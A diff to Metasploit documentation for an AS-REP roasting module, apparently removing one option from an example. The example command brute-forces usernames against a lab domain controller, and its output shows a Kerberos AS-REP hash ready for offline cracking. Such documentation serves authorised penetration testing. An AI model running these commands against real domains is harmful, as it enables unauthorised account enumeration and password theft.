@@ -44,7 +44,7 @@ usually preferable, but may be less stealthy.
 An example of brute forcing usernames, in the hope of finding one with pre-auth not required:
 
 ```msf
-msf6 auxiliary(gather/asrep) > run action=BRUTE_FORCE user_file=/tmp/users.txt rhost=192.168.1.1 domain=msf.local rhostname=dc22
+msf6 auxiliary(gather/asrep) > run action=BRUTE_FORCE user_file=/tmp/users.txt rhost=192.168.1.1 domain=msf.local
 [*] Running module against 192.168.1.1
 
 $krb5asrep$23$user@MSF.LOCAL:9fb9954fa32193185ab32e2de2ab9f13$bf14e834c661246cad302073c228e6ff7894cd3023665f0f84338432c3929922ae998c4a23bb9d163dda536a230d0503b2cf575389317b52bde782264940e80206a29e9613e47328228441cf013fb1f6672359f6799be97b962de9429e8859f437e53549be6b11ca07af6f09eae6cd78279af6d7f6dcdfd011eccb74b4aa753b2f9e6561c59c9408ee4bec983777908f3a7eef5fba977710e47e4e8ac0af10608a7dd23db506202b27d7892bc28426d2080c343edfe243bf1cae554cf6204733082332be2455e4674e1c3e84614818a6c15b54221dcaa832
